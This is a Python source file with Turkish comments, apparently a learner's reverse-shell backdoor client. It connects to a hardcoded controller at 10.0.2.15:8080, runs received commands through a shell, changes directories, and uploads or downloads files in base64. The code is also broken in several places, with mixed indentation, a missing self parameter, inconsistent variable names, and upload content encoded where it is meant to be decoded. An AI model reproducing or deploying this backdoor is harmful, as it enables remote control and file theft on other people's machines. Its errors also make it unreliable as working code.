import socket
import subprocess # command çalıstırma
import simplejson
import os #operation system
import base64
"""
subprocess -> kod içerisinde, terminalde (veya command prompt'ta) komut çalıştırır gibi bilgisayarımıza komut vermeye yarıyor. örneğin ls komutunu açıp terminalde çalıştırır gibi kod içerisinde çalıştırabiliyorum.
optparse -> terminal içinde kullanıcıdan input almaya yarıyor.
type(more) pyhton.exe = verileri getiriyor bölüm bölüm veri alıyor
Tcp ile dataları biz streamle yolluyoruz
"""

class MySocket:
"""docstring for MySocket"""
    def __init__(self, ip,port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
		self.my_connection.connect((ip,port))
	
	def command_execution(command):
		return subprocess.check_output(command,shell=True) # command ı shell ile çalıştır
		# bu komutun sonucunu yollamak
	def json_send(self,data):
		json_data =simplejson.dumps(data)
		self.my_connection.send(json_data.encode("utf-8"))

	def json_receive(self):
		json_data=""
        while True: # işlem jsona döndürene kadar devam et
            try:
                json_data=json_data+self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError: # bitmezse
                continue # devam et

    def execute_cd_command(self,directory):
    	os.chdir(directory)
    	return "Cd to"+directory
    def read_file(self,path): # dosya okuma path değişkeni dosya ismi
    	with open(path,"rb") as myfile: # path dosyasını oku binary olarak
    		return base64.b64encode(myfile.read())

    def save_file(self,path,content):
    	with open(path,"wb") as my_file:
    		my_file.write(base64.b64encode(content))
    		return "Upload OK"
	def start_socket(self):
		while True:
			command_= self.json_receive() # 1024 byte lık veri alma
			try:
				if command_input[0]=="quit": # gelen komut quit se
	            	self.my_connection.close() # bağlantıyı sonlandır
	            	exit() # çıkıs yap pyhtonın builder fonksiyonu
				elif command[0]=="cd" and len(command)>1:
					command_output=self.execute_cd_command(command[1])
				elif command[0]=="download":
					command_output=self.read_file(command[1]) #binary olarak al json alarak yolla
				elif command[0]=="upload":
					command_output=self.save_file(command[1],command[2])
				else:
					command_output=self.command_execution(command)
				
			except Exception:
				command_output="Error!"
			self.json_send(command_output)

		self.my_connection.close()

	my_socket_object=MySocket("10.0.2.15",8080)
	my_socket_object.start_socket()
	 